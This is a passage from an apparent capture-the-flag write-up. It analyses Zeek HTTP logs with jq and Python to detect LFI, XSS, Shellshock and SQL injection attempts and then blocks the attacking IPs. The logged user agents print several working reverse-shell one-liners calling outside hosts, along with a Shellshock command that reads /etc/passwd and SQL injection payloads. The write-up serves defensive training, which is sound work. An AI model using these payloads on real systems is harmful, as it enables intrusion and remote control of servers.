custom.","title":"Getting the logins to the SRF portal"},{"location":"objectives/objective12/#understanding-the-api-the-logs","text":"Log to the SRF portal using the credentials we found: username: admin password: 924158F9522B3744F5FCD4D10FAC4356 The SLEIGH ROUTE FINDER API portal Open the API Docs To Update The Measurements For a Specific Global Elf Weather Station: HTTP POST REQUEST TO -http://srf.elfu.org/api/measurements HTTP HEADER OF-Content-Type: application/json API Request All StationIDS: HTTP GET REQUEST -http://srf.elfu.org/api/stationsAPI Request All Stations Weather Data: HTTP GET REQUEST -http://srf.elfu.org/api/weather?station_id=* API Request One Stations Weather Data: HTTP GET REQUEST -http://srf.elfu.org/api/weather?station_id=abcd1234API Request Multiple Specific StationsWeatherData: HTTP GET REQUEST -http://srf.elfu.org/api/weather?station_id=abcd1234,abcd1235 It's important to understand the correct url/requests for api. Look at first entry structure: 3 to understand the content of each object in the logs. 1 cat http.log | jq '.[0]' { \"ts\" : \"2019-10-05T06:50:42-0800\" , \"uid\" : \"ClRV8h1vYKWXN1G5ke\" , \"id.orig_h\" : \"238.27.231.56\" , \"id.orig_p\" : 60677 , \"id.resp_h\" : \"10.20.3.80\" , \"id.resp_p\" : 80 , \"trans_depth\" : 1 , \"method\" : \"GET\" , \"host\" : \"srf.elfu.org\" , \"uri\" : \"/14.10/Google/\" , \"referrer\" : \"-\" , \"version\" : \"1.0\" , \"user_agent\" : \"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.2b4) Gecko/20091124 Firefox/3.6b4 (.NET CLR 3.5.30729)\" , \"origin\" : \"-\" , \"request_body_len\" : 0 , \"response_body_len\" : 232 , \"status_code\" : 404 , \"status_msg\" : \"Not Found\" , \"info_code\" : \"-\" , \"info_msg\" : \"-\" , \"tags\" : \"(empty)\" , \"username\" : \"-\" , \"password\" : \"-\" , \"proxied\" : \"-\" , \"orig_fuids\" : \"-\" , \"orig_filenames\" : \"-\" , \"orig_mime_types\" : \"-\" , \"resp_fuids\" : \"FUPWLQXTNsTNvf33\" , \"resp_filenames\" : \"-\" , \"resp_mime_types\" : \"text/html\" } We have interesting parameters host , uri , user_agent , status_code , username . and we can search for unique values in each, for example: cat http.log | jq '.[] | .username ' | sort | uniq \"' or '1=1\" \"(empty)\" \"-\" \"-r nessus\" \"6666\" \"Admin\" \"admin\" \"comcomcom\" \"q1ki9\" \"root\" \"servlet\" \"support\" This well help us searching and pivoting for each attack in the next step.","title":"Understanding the API &amp; the logs"},{"location":"objectives/objective12/#searching-for-attacks","text":"Local File Inclusion (LFI): The File Inclusion vulnerability allows an attacker to include a file, that are already locally present on the server. And it's occurs when paths passed to \"include\" statements are not properly sanitized. 2 Typical proof-of-concept would be to load passwd file. So we will to search for .. , /etc , || , pass in uri . cat http.log | jq '.[] | select ( .uri | contains(\"..\",\"/etc\",\"||\",\"pass\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv .[\"id.orig_h\"] return source ip sort sort result uniq remove duplicates &>> detected_ips.csv add result to csv file Cross-Site Scripting (XSS): Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. Since the XSS attacks may be conducted without using <script></script> tags. Other tags will do exactly the same thing: 2 <body onload=alert('test1')> So we will to search for < in uri and host . cat http.log | jq '.[] | select ( .uri | contains(\"<\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .host | contains(\"<\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv Shellshock: Shellshock is a family of security bugs[2] in the Unix Bash shell 3 , that use the User-Agent string to attack. Example of Execution curl -A '() { :;}; echo \"Content-Type: text/plain\"; echo; /bin/cat /etc/passwd' http://192.168.1.14/cgi-bin/status > passwd So we will to search for the string () { :; }; in uri , host , user_agent cat http.log | jq '.[] | select ( .user_agent | contains(\"() { :; };\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv SQLi: A SQL injection attack consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. 2 We will search for /* , ** , UNION , ' in uri , host , username , user_agent cat http.log | jq '.[] | select ( .uri | contains(\"/*\",\"**\",\" UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .host | contains(\"/*\",\"**\",\" UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .username | contains(\"/*\",\"**\",\" UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .user_agent | contains(\"/*\",\"**\",\" UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv Connections with status_msg is 400 Bad Request : if we lookup unique the status message for the requests cat http.log | jq '.[] | select( .status_msg !=\"-\") | .status_code, .status_msg ' | sort | uniq \"Bad Request\" \"Not Found\" \"Not Modified\" \"OK\" We will see interesting Bad Request msg which means The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid request message framing, or deceptive request routing)| 5 . Let's add the ips from the requests with 400 Bad Request cat http.log | jq '.[] | select((.status_code == 400)) | .[\"id.orig_h\"]' | sort | uniq & >> detected_ips.csv All Commands at once: cat http.log | jq '.[] | select ( .uri | contains(\"..\",\"/etc\",\"||\",\"pass\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .uri | contains(\"<\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .host | contains(\"<\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .user_agent | contains(\"() { :; };\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .username | contains(\"/*\",\"**\",\"UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .uri | contains(\"/*\",\"**\",\"UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .host | contains(\"/*\",\"**\",\"UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select ( .user_agent | contains(\"/*\",\"**\",\" UNION\",\"' \"'\" '\") ) | .[\"id.orig_h\"] ' | sort | uniq & >> detected_ips.csv cat http.log | jq '.[] | select((.status_code == 400)) | .[\"id.orig_h\"]' | sort | uniq & >> detected_ips.csv To remove all ips duplicates and double quotes \" : cat detected_ips.csv | sort | uniq | tr -d '\"' > detected_ips_clean.csv Also use wc -l command to count the ips. cat detected_ips_clean.csv | wc -l Unique malicious ip list 81 0.216.249.31,1.185.21.112,10.155.246.29,102.143.16.184,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,121.7.186.163,123.127.233.97,129.121.121.48,13.39.153.254,131.186.145.73,132.45.187.177,135.203.243.43,135.32.99.116,150.45.133.97,150.50.77.238,155.129.97.35,168.66.108.62,169.242.54.5,173.37.160.150,180.57.20.247,186.28.46.179,187.178.169.123,19.235.69.221,190.245.228.38,193.228.194.36,194.143.151.224,2.230.60.70,2.240.116.254,200.75.228.240,211.229.3.254,220.132.33.81,223.149.180.133,225.191.220.138,227.110.45.126,229.133.163.235,229.229.189.246,23.49.177.78,23.79.123.99,230.246.50.221,233.74.78.199,238.143.78.114,249.34.9.16,25.80.197.172,250.51.219.47,253.182.102.55,254.140.181.172,27.88.56.114,28.169.41.122,31.254.228.4,32.168.17.54,33.132.98.193,34.129.179.28,42.103.246.250,42.191.112.181,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,52.39.201.107,56.5.47.137,6.144.27.227,61.110.82.125,65.153.114.120,68.115.251.76,69.221.145.150,72.183.132.206,75.215.214.65,75.73.228.192,79.198.89.109,80.244.147.207,81.14.204.154,83.0.8.119,84.147.231.129,84.185.44.166,9.206.212.33,9.95.128.208,95.166.116.45 We have 81 unique malicious ip in our blacklist , let's find a pivot point to find the rest.","title":"Searching for attacks"},{"location":"objectives/objective12/#pivoting-on-suspicious-useragents-of-detected-ips","text":"Get all UserAgents for ips we have collected for ips in $(cat detected_ips_clean.csv ) do cat http.log | jq --arg ip $ips '.[] | select( .[\"id.orig_h\"] ==$ip ) | .user_agent ' | sort | uniq | tr -d '\"' &>> suspicious_ua.txt tr -d '\"' removes \" from each ip. --arg This option passes a value $ips to the jq program as a predefined variable $ip . List of suspicious UserAgents based on ips collected 1' UNION/**/SELECT/**/1,2,434635502,4/*&blog=1 Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25 Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1) Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0) Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR 1.1.4322) Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html) 1' UNION SELECT '1','2','automatedscanning','1233627891','5'/* Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS) 1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- ' Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0) Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12 Wget/1.9+cvs-stable (Red Hat modified) 1' UNION SELECT -1,'autosc','test','O:8:\\\\\\stdClass\\\\\\:3:{s:3:\\\\\\mod\\\\\\;s:15:\\\\\\resourcesmodule\\\\\\;s:3:\\\\\\src\\\\\\;s:20:\\\\\\@random41940ceb78dbb\\\\\\;s:3:\\\\\\int\\\\\\;s:0:\\\\\\\\\\\\;}',7,0,0,0,0,0,0 /* Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731 Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.4.15451 1' UNION/**/SELECT/**/994320606,1,1,1,1,1,1,1/*&blogId=1 CholTBAgent () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\150.45.133.97\\,54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\/bin/sh\\,\\-i\\]);' Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5 Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9b2) Gecko/2007121016 Firefox/3.0b2 Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36 Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.18) Gecko/2010021501 Ubuntu/9.04 (jaunty) Firefox/3.0.18 1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- ' Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729) 1' UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, -- Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0) Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1) Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; ) Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5 Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5 Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0) Mozilla/5.0 WinInet Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5 () { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash' Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0) Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322) () { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open(\\227.110.45.126\\,43870).to_i;exec sprintf(\\/bin/sh -i <&%d >&%d 2>&%d\\,f,f,f)' Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729) () { :; }; /usr/bin/php -r '$sock=fsockopen(\\229.229.189.246\\,62570);exec(\\/bin/sh -i <&3 >&3 2>&3\\);' Mozilla/4.0 (compatible MSIE 5.0;Windows_98) Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6pre) Gecko/2008121605 Firefox/3.0.6pre Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6. Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16 Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1) Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30 Opera/6.05 (Windows 2000; U) [oc] Opera/8.81 (Windows-NT 6.1; U; en) Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22 Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0 Mozilla/5.0 (Windows NT 10.0;Win64;x64) () { :; }; /bin/bash -i >& /dev/tcp/31.254.228.4/48051 0>&1 Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; DigExt) Mozilla/5.0 (Windows; U; Windows NT 5.2; sk; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15 Mozilla/5.0 (Windows NT 5.1 ; v.) Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1) Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0) Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13 RookIE/1.0 Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0) Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5 HttpBrowser/1.0 Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008092318 Fedora/3.0.2-1.fc9 Firefox/3.0.2 Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1 Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1 1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- ' Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1) Opera/9.23 (Windows NT 5.0; U; en) Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080419 Ubuntu/8.04 (hardy) Firefox/2.0.0.12 MEGAUPLOAD 1.0 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727) Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC) Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 1' UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/*&blogId=1 () { :; }; /usr/bin/perl -e 'use Socket;$i=\\83.0.8.119\\;$p=57432;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\tcp\\));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\>&S\\);open(STDOUT,\\>&S\\);open(STDERR,\\>&S\\);exec(\\/bin/sh -i\\);};' Mozilla/4.0 (compatible; Metasploit RSPEC) Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1) Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1 Mozilla/5.0 (Windows; U; Windows NT 5.1; en-CA) AppleWebKit/534.13 (KHTML like Gecko) Chrome/9.0.597.98 Safari/534.13 Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19 We can select the known suspicious user-agents 4 from the output to pivot on: Rookie An Info Stealer designed to extract user account information such as logins and passwords and send them to a remote server. The HTTP communication is done using an uncommon User Agent called RookIE/1.0 . 6 RookIE/1.0 HttpBrowser RAT Backdoor is malware that has been used by several threat groups with notable for HTTPS communications with the HttpBrowser/1.0 User-Agent. 7 HttpBrowser/1.0 Dyre / Upatre Dyreza is able to intercept SSL traffic in Internet Explorer, Firefox and Chrome by hooking the browser via several API functions. 8 Wget/1.9+cvs-stable (Red Hat modified) Metasploit framework which is a widely used penetration testing tool and used also for hacking. Metasploit User Agent Strings: Mozilla/4.0 (compatible; Metasploit RSPEC) Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13 and we have others two with typing errors or space missing Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1) Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1) Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0) Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6. Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0) Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html) W32/Kazy A trojan is a type of malware that performs activities without the user\u2019s knowledge. These activities commonly include establishing remote access connections, capturing keyboard input, collecting system information, downloading/uploading files, dropping other malware into the infected system, performing denial-of-service (DoS) attacks, and running/terminating processes. 9 Mozilla/5.0 (Windows NT 5.1 ; v.) Fun Web Products - Adware applications 10 Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Adware Toolbar from PeoplePc 10 Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727) Sality botnet Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729) Opera/8.81 (Windows-NT 6.1; U; en) Malware: Generic Trojan 9 Mozilla/5.0 WinInet Malware User Agent 12 CholTBAgent AntiVirXP08, also known as Anti Vir XP 08, AntivirusXP2008 or Antivirus XP 2008, is a rogue anti-spyware program and clone of XP Antivirus. Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322) PlugX APT Malware PlugX is a RAT (Remote Access Trojan) malware family that is around since 2008 and is used as a backdoor to fully control the victim's machine. Once the machine is infected, a cybercriminal can remotely execute several kinds of commands on the affected system. 14 Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1) and we have others with typing errors or space missing Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR 1.1.4322) Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0) Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; ) Fareit Malware 15 Mozilla/4.0 (compatible MSIE 5.0;Windows_98) and we have others with typing errors or space missing Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0) Zebrocy malware 15 Mozilla/5.0 (Windows NT 10.0;Win64;x64) Misconfigured UserAgents 11 The correct user-agent should be structured like this Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]. From above list we can detect a few misconfigured user-agents: Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1) MSIEE Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS) Windows NTS Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0) W1ndow Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0) 500.0 Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1 666 Also we have a few with space missing Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0) NT6.0 Create a list with all user agents we will pivot on: RookIE/1.0 HttpBrowser/1.0 Wget/1.9+cvs-stable (Red Hat modified) Mozilla/4.0 (compatible; Metasploit RSPEC) Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N Mozilla/5.0 (Windows NT 5.1 ; v.) Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727) Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729) Opera/8.81 (Windows-NT 6.1; U; en) Mozilla/5.0 WinInet CholTBAgent Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6. Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0) Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322) Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0) Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1) Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS) Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0) Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR 1.1.4322) Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html) Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; ) Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1) Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1) Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0) Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0) Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1) Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13 Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0) Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; ) Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1) Mozilla/4.0 (compatible MSIE 5.0;Windows_98) Mozilla/5.0 (Windows NT 10.0;Win64;x64) Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1 We can search now for the related ips and added to the ips file while IFS = read -r line ; do cat http.log | jq --arg ua $line '.[] | select(.user_agent == $ua ) | .[\"id.orig_h\"] ' | sort | uniq done < pivot_useragents.txt | sort | uniq | tr -d '\"' & >> detected_ips_clean.csv IFS= read -r line to read file line by line. Remove all ips duplicates and count the results. cat detected_ips_clean.csv | sort | uniq > detected_ips_final.csv cat detected_ips_final.csv | wc -l Unique malicious ip list 111 0.216.249.31,1.185.21.112,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,106.93.213.219,111.81.145.191,116.116.98.205,118.196.230.170,118.26.57.38,121.7.186.163,123.127.233.97,129.121.121.48,13.39.153.254,131.186.145.73,132.45.187.177,135.203.243.43,135.32.99.116,140.60.154.239,142.128.135.10,148.146.134.52,150.45.133.97,150.50.77.238,155.129.97.35,158.171.84.209,168.66.108.62,169.242.54.5,173.37.160.150,180.57.20.247,185.19.7.133,186.28.46.179,187.152.203.243,187.178.169.123,19.235.69.221,190.245.228.38,193.228.194.36,194.143.151.224,2.230.60.70,2.240.116.254,200.75.228.240,203.68.29.5,211.229.3.254,217.132.156.225,22.34.153.164,220.132.33.81,223.149.180.133,225.191.220.138,226.102.56.13,226.240.188.154,227.110.45.126,229.133.163.235,229.229.189.246,23.49.177.78,23.79.123.99,230.246.50.221,231.179.108.238,233.74.78.199,238.143.78.114,249.237.77.152,249.34.9.16,249.90.116.138,25.80.197.172,250.22.86.40,250.51.219.47,252.122.243.212,253.182.102.55,253.65.40.39,254.140.181.172,27.88.56.114,28.169.41.122,29.0.183.220,31.116.232.143,31.254.228.4,32.168.17.54,33.132.98.193,34.129.179.28,34.155.174.167,37.216.249.50,42.103.246.250,42.127.244.30,42.191.112.181,44.164.136.41,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,50.154.111.0,52.39.201.107,53.160.218.44,56.5.47.137,6.144.27.227,61.110.82.125,65.153.114.120,66.116.147.181,68.115.251.76,69.221.145.150,72.183.132.206,75.215.214.65,75.73.228.192,79.198.89.109,80.244.147.207,81.14.204.154,83.0.8.119,84.147.231.129,84.185.44.166,9.206.212.33,9.95.128.208,95.166.116.45,97.220.93.190 We have now 111 unique malicious ips in our blacklist.","title":"Pivoting on suspicious UserAgents of detected ips"},{"location":"objectives/objective12/#blocking-the-malicious-ips","text":"Add , after each ip to convert to csv format cat detected_ips_clean.csv | tr '\\n' ',' Copy the result to the Firewall: Route Calculation Success! RID: 0807198508261964 Congratulations! You have completed the Filter Out Poisoned Sources of Weather Data challenge! Alternative Method We could use python to filter the ips from the logs: import json # Searching for the attacks #LFI lfi_detects = [ \"..\" , \"/etc\" , \"||\" , \"pass\" ] #XSS xss_detects = [ \"<\" ] #Shellshock ss_detects = [ \"() { :; };\" ] #SQLi sqli_detects = [ \"/*\" , \"**\" , \"UNION\" , \"'\" ] #list of status_msg status_msgs = [ \"Bad Request\" ] # list of malicious user agents to pivot from the file we generated with open ( 'pivot_useragents.txt' ) as f : ua_blacklist = [ line . rstrip ( ' \\n ' ) for line in f ] # list of malicious ips blacklist = set () # load logs http_logs = json . load ( open ( \"http.log\" )) # iterate over entries and filter based on identified markers of IoC for log in http_logs : for detect in lfi_detects : if detect in log [ 'uri' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) for detect in xss_detects : if detect in log [ 'uri' ] or detect in log [ 'host' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) for detect in ss_detects : if detect in log [ 'user_agent' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) for detect in sqli_detects : if detect in log [ 'uri' ] or detect in log [ 'host' ] or detect in log [ 'username' ] or detect in log [ 'user_agent' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) for message in status_msgs : if message in log [ 'status_msg' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) for ua in ua_blacklist : if ua in log [ 'user_agent' ] and log [ 'id.orig_h' ] not in blacklist : blacklist . add ( log [ 'id.orig_h' ]) # print how many ips we got print ( len ( blacklist )) # print ips blacklist and add `,` after each ip to convert to csv format print ( \",\" . join ( blacklist ))","title":"Blocking the malicious ips"},{"location":"objectives/objective12/#what-youve-learned","text":"Zeek logs json format and content Search in Zeek logs using jq tool Pivoting based on results like UserAgents Knowing different malicious UserAgents Using sort , uniq , tr , wc commands https://docs.zeek.org/en/stable/scripts/base/protocols/http/main.zeek.html#type-HTTP::Info \u21a9 https://cheatsheetseries.owasp.org/ \u21a9 \u21a9 \u21a9 https://www.crowdstrike.com/blog/mitigating-bash-shellshock/ https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html 